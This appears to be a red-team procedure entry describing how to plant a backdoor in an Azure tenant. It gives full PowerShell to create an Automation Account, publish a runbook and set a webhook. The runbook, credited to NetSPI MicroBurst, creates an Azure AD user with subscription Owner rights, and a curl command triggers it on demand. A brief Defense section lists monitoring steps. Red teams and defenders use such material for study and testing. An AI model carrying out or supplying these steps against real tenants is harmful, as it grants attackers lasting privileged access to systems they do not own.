---
id: 34df8668-8d53-4aad-8230-3608be6d4557
name: Azure-Automation-Account-Runbook-Persistence
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.590053+00:00'
updated_at: '2023-05-25T03:28:25.307449+00:00'
tactics:
  - '[[Defense Evasion]]'
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[Scheduled Task]]'
  - '[[Scripting]]'
sub_techniques: []
tags:
  - cloud-azure
  - persistence
  - automation-account
  - runbook
commands:
  - '[[commands/curl-trigger-azure-webhook]]'
tools: []
platforms:
  - Azure
validated: true
---

# Azure-Automation-Account-Runbook-Persistence

## Summary

This procedure establishes persistence in an Azure environment by creating an Automation Account with a custom Runbook that, when triggered via a webhook, generates a new Azure AD user account and assigns it the Owner role. This backdoor user provides ongoing access even if initial credentials are revoked, enabling future execution, evasion, and privilege escalation.

## Description

In Azure, Automation Accounts can execute Runbooks (scripts) on a schedule or via webhooks, often using a built-in 'Run As' service principal for authentication. An attacker with initial access (e.g., compromised credentials) can create an Automation Account, import a malicious Runbook, and configure a webhook to trigger user creation on demand. The Runbook uses the service principal to connect to Azure AD and Resource Manager, parses webhook input for username/password, creates the user, and assigns the Owner role at the subscription level. This technique leverages scheduled task execution (T1053) via cloud automation and scripting (T1064) for persistence (TA0003), evasion (TA0005), execution (TA0002), and escalation (TA0004). It targets Azure tenants with insufficient monitoring on Automation Account changes and webhook invocations.

## Requirements

1. Azure PowerShell modules (Az.Accounts, Az.Automation, AzureAD) installed and imported.
2. Valid Azure credentials with permissions to create Automation Accounts, import Runbooks, and create webhooks (e.g., Contributor role on a resource group).
3. Access to a resource group and subscription where the Automation Account will be created.
4. PowerShell execution environment (e.g., Azure Cloud Shell or local with Az login).

## Defense

- Monitor Automation Account creations, Runbook imports, publications, and webhook configurations via Azure Activity Logs and Microsoft Defender for Cloud.
- Implement least-privilege access: Restrict who can create/modify Automation Accounts and enable Run As accounts only when necessary.
- Enable logging for webhook invocations and review for anomalous user creations in Azure AD (e.g., via Azure AD audit logs).
- Use Azure Policy to deny webhook creation or require approval workflows.
- Rotate service principal certificates regularly and monitor for unusual role assignments.

## Objectives

1. Establish a persistent backdoor by creating a webhook-triggerable Runbook that generates elevated user accounts.
2. Maintain access to the Azure subscription for future operations like data exfiltration or lateral movement.
3. Achieve subscription-level Owner privileges through the created user.

## Instructions

### Step 1: Set Up Automation Account and Webhook

**Context**: Create the Automation Account, import the Runbook script, publish it, and configure a durable webhook to enable on-demand triggering. This step requires substituting variables with environment-specific values and running the setup script.

**Code** ([[codes/Azure-Automation-Account-Setup-Script]]):

```powershell
# Variables
$automationAccountName = "<YourAutomationAccountName>"
$resourceGroupName = "<YourResourceGroupName>"
$location = "<YourResourceLocation>"
$runbookName = "runbook.ps1"
$webhookName = "<YourWebhookName>"
$webhookExpiryDate = (Get-Date).AddYears(1) # The webhook will expire in 1 year.

# Create an Automation Account with 'Run As' account
New-AzAutomationAccount -Name $automationAccountName -Location $location -ResourceGroupName $resourceGroupName -Plan Free 

# Import the runbook
Import-AzAutomationRunbook -AutomationAccountName $automationAccountName -ResourceGroupName $resourceGroupName -Path $runbookName -Type PowerShell -Force -LogVerbose

# Publish the runbook
Publish-AzAutomationRunbook -AutomationAccountName $automationAccountName -Name $runbookName

# Generate a webhook URI
$webhookURI = New-AzAutomationWebhookURI

# Create a webhook for the runbook
New-AzAutomationWebhook -ResourceGroupName $resourceGroupName -AutomationAccountName $automationAccountName -RunbookName $runbookName -ExpiryTime $webhookExpiryDate -IsEnabled $true -Name $webhookName -URI $webhookURI

# Output the webhook URI
$webhookURI
```

> This script outputs the webhook URI (including token) upon success. Save this URI securely for triggering. Verify creation in the Azure portal under Automation Accounts > [Account] > Runbooks > [Runbook] > Webhooks.

### Step 2: Deploy the User Creation Runbook Script

**Context**: Save and prepare the core Runbook script (runbook.ps1) that handles webhook data to create the user and assign roles. This script runs in the Automation Account context using the built-in Run As connection.

**Code** ([[codes/Azure-Automation-Runbook-User-Creation-Script]]):

```powershell
# runbook.ps1
# NetSPI - https://github.com/NetSPI/MicroBurst/blob/master/Misc/AutomationRunbook-OwnerPersist.ps1
# Automation Runbook Owner Persistence

param
(
    [Parameter (Mandatory = $false)]
    [object] $WebhookData
)

import-module AzureAD

# Get Azure Run As Connection Name
$connectionName = "AzureRunAsConnection"

# Get the Service Principal connection details for the Connection name
$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName         

# Logging in to Azure AD with Service Principal
$azureADConnection = Connect-AzureAD -TenantId $servicePrincipalConnection.TenantId `
    -ApplicationId $servicePrincipalConnection.ApplicationId `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

# Ensures you do not inherit an AzureRMContext in your runbook
Disable-AzureRmContextAutosave -Scope Process | out-null

# Logging in to Azure RM with Service Principal
$azureRMConnection = Connect-AzureRmAccount -ServicePrincipal -Tenant $servicePrincipalConnection.TenantID `
    -ApplicationID $servicePrincipalConnection.ApplicationID `
    -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint

$AzureContext = Select-AzureRmSubscription -SubscriptionId $servicePrincipalConnection.SubscriptionID

# Setup Password Object
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile

# Read Webhook data
if($WebhookData -ne $null){

    $BodyContent = ($WebhookData.RequestBody | ConvertFrom-Json)

    # Retrieve Username from Webhook request body
    if ($BodyContent.RequestBody.Username -ne $null){$UPN = ($BodyContent.RequestBody.Username)+'@'+$azureADConnection.TenantDomain}

    # Retrieve Password from Webhook request body    
    if ($BodyContent.RequestBody.Password -ne $null){$PasswordProfile.Password = $BodyContent.RequestBody.Password}
}
else{exit;}
    

# Add New AzureAD Account
New-AzureADUser -DisplayName $BodyContent.RequestBody.Username -PasswordProfile $PasswordProfile -UserPrincipalName $UPN -AccountEnabled $true -MailNickName $BodyContent.RequestBody.Username

# Add account to Owners Group
New-AzureRmRoleAssignment -SignInName $UPN -RoleDefinitionName Owner
```

> The script authenticates using the Run As connection, parses the webhook JSON for Username and Password, creates the user in Azure AD, and assigns the Owner role. If no webhook data, it exits. Test by manually triggering the Runbook in the portal (without webhook) to ensure no errors.

### Step 3: Trigger Webhook for Persistent User Creation

**Context**: When persistence is needed, send a JSON payload to the webhook URI to invoke the Runbook and create the backdoor user. This can be done remotely without direct Azure access.

**Command** ([[commands/curl-trigger-azure-webhook]]):

```bash
curl -d '{"RequestBody":{"Username":"NewAzureOwnerAccount","Password":"Password123"}}' -H "Content-Type: application/json" -X POST https://s15events.azure-automation.net/webhooks?token=<YOUR_WEBHOOK_TOKEN>
```

> Replace <YOUR_WEBHOOK_TOKEN> with the full URI token from Step 1. The command sends a POST with JSON containing Username and Password. On success, the Runbook executes silently; verify user creation in Azure AD and role assignment in IAM.
